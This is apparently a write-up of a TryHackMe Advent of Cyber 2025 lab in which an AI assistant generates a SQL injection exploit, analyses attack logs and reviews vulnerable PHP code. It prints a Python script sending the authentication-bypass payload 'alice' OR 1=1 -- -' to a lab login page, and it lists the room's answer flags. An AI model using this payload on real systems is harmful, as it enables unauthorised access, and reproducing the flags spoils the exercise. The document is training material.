# Day 4 — old sAInt nick

**Platform:** TryHackMe  
**Category:** Artificial Intelligence / Security Operations  
**Difficulty:** Easy  
**Room:** Advent of Cyber 2025 — Day 4  
**Tools Used:** Van SolveIT (AI Assistant), Python, Web Browser

---

## Objective

TBFC is trialling a new AI security assistant — Van SolveIT — to identify and resolve vulnerabilities before the holidays. The challenge demonstrates how AI can be applied across three security domains: Red Team (exploit generation), Blue Team (log analysis), and Software (code vulnerability review), while also highlighting the real-world limitations and risks of AI in security workflows.

Learning objectives for this room:

- Understand how AI can assist across multiple cybersecurity domains
- Use an AI assistant to complete Red Team, Blue Team, and Software security tasks
- Recognise the considerations and limitations of deploying AI in cybersecurity contexts
- Execute an AI-generated SQL injection exploit against a vulnerable web application

---

## Environment Setup

This room requires access to the Van SolveIT web interface and a vulnerable target machine, accessible via the TryHackMe AttackBox or VPN.

| Field | Value |
|---|---|
| AI Assistant URL | `http://10.67.153.91` |
| Vulnerable App URL | `http://10.67.153.91` |
| Exploit Language | Python |
| Vulnerability Type | SQL Injection (SQLi) |

---

## Walkthrough

### Task 1 — Introduction

TBFC has deployed Van SolveIT, an AI security assistant, to help their elves handle tedious security tasks more efficiently as Christmas approaches. The room places us in the role of a security professional evaluating AI across three showcases: generating and running an exploit (Red), analysing attack logs (Blue), and reviewing vulnerable source code (Software).

---

### Task 2 — AI for Cyber Security Showcase

**The Role of AI in Cybersecurity**

Before the practical stages, the room covers where AI is making an impact across security domains:

- **Defensive (Blue Team):** AI agents continuously process telemetry — logs, network flows, endpoint signals — adding context to alerts and automating responses such as isolating infected devices or blocking suspicious logins in real time
- **Offensive (Red Team):** AI accelerates reconnaissance, OSINT collection, scanner output analysis, and attack surface mapping, freeing pentesters to focus on the creative, high-judgement work that requires human expertise
- **Software Security:** AI-powered SAST and DAST scanners audit written code and running applications for vulnerabilities — notably, AI tends to be better at *finding* vulnerabilities than writing secure code from scratch

---

### Task 3 — Red Team: Exploit Generation & Execution

**Objective:** Use Van SolveIT to generate a SQL injection exploit and run it against the vulnerable target.

Prompted Van SolveIT to analyse the target web application. The AI identified a SQL injection vulnerability in the login endpoint and generated a Python exploit script. The `MACHINE_IP` placeholder in the script was updated with the target IP before execution:

script.py:
  GNU nano 4.8                                        script.py                                        Modified  
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://10.67.153.91:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)


```bash
python3 script.py
```

The script successfully exploited the SQLi vulnerability and returned the flag in its output.

---

### Task 4 — Blue Team: AI-Assisted Log Analysis

**Objective:** Provide Van SolveIT with web server logs from the attack and use it to reconstruct what happened.

The AI parsed the access logs and identified the attack pattern — correlating the suspicious IP address, anomalous user agents, and malicious URI paths — before producing a structured summary of the attack timeline and recommending remediation steps. This demonstrated how AI can reduce triage time significantly by handling initial log correlation.

---

### Task 5 — Software: Source Code Vulnerability Review

**Objective:** Submit `login.php` to Van SolveIT for static analysis and identify the security flaw.

The AI identified that user-supplied input was being passed directly into a database query without sanitisation — a classic SQL injection vulnerability. Van SolveIT then produced specific code-level recommendations to fix the issue, illustrating its value as a SAST tool within a secure development lifecycle.

---

## Answer Summary

<details>
  <summary>Spoilers - click to reveal</summary>

| # | Question | Answer |
|---|---|---|
| 1 | Complete the AI showcase — what is the flag presented? | `THM{AI_MANIA}` |
| 2 | Execute the exploit against the vulnerable app — what is the flag in the output? | `THM{SQLI_EXPLOIT}` |

</details>

---

## Lessons Learned

**Tools introduced:**

| Tool | Purpose |
|---|---|
| Van SolveIT | AI security assistant used for exploit generation, log analysis, and code review |
| Python exploit script | AI-generated script to exploit a SQL injection vulnerability |

**Key takeaways:**

- AI is most valuable in cybersecurity as a **force multiplier** — handling repetitive, time-consuming tasks so analysts can focus on complex decisions
- AI-generated exploit scripts work for well-known vulnerability classes like SQLi, but must always be reviewed before use in live engagements
- AI-assisted log triage can surface attack patterns in minutes that might take a human analyst hours to correlate manually
- AI is effective at identifying code vulnerabilities (SAST) but less reliable at writing inherently secure code — an important asymmetry for defenders to understand
- AI output cannot be assumed to be 100% accurate — verification is always required, especially in security-critical contexts
- Using AI in offensive engagements carries real risk: automated tools can trigger race conditions, cause unintended service disruption, or generate false positives

---

## Defensive Recommendations

**Technical controls:**

- Use parameterised queries / prepared statements to eliminate SQL injection at the code level
- Integrate AI-powered SAST tools into CI/CD pipelines to catch vulnerabilities before code reaches production
- Deploy AI-assisted SIEM rules to automatically correlate logs and surface anomalies faster than manual triage allows
- Restrict and monitor access to AI assistant interfaces — submitted data (logs, source code) may contain sensitive information

**Process controls:**

- Always human-review AI-generated exploit code before execution in any engagement
- Treat AI output as a starting point for investigation, not a definitive conclusion — verify findings independently
- Establish clear policies on what data can be submitted to AI tools, particularly regarding customer data, source code, and incident logs
- Train SOC analysts on AI-assisted workflows so they can critically evaluate AI suggestions rather than blindly accepting them

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Exploit Public-Facing Application | T1190 | SQL injection exploited against the vulnerable web application login endpoint |
| Valid Accounts | T1078 | SQLi used to bypass authentication and gain unauthorised access |
| Automated Collection | T1119 | AI tooling used to automate reconnaissance and log analysis tasks |

---

*Part of the [Advent of Cyber 2025](../README.md) series · [CTFs Repository](../../../README.md)*
